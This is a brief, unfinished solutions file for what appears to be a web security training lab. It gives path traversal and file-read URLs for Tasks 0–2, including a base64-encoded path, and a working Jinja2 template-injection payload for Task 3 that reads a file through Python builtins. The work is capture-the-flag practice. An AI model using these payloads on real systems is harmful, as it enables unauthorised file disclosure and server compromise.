WIP

---
### Solutions:

- Task 0:
	URL: http://web0x07.hbtn/task0/download_file?filename=0-flag.txt&path=/etc

- Task 1:
	URL: http://web0x07.hbtn/task1/download_file?filename=1-flag.txt&path=..//etc

- Task 2:
	URL: http://web0x07.hbtn/task2/download_file?filename=&path=L2V0Yy8yLWZsYWcudHh0 = /etc/2-flag.txt

- Task 3:
	- Create a rapport at http://web0x07.hbtn/task3/create_rapport
		- Put {{5*5}} inside it to test Jinja2
		- Check output at http://web0x07.hbtn/task3/list_file
	- Create a Jinja2 payload to show file /etc/3-flag.txt
	- Payload: {{ cycler.__init__.__globals__['__builtins__']['open']('/etc/3-flag.txt').read() }} 
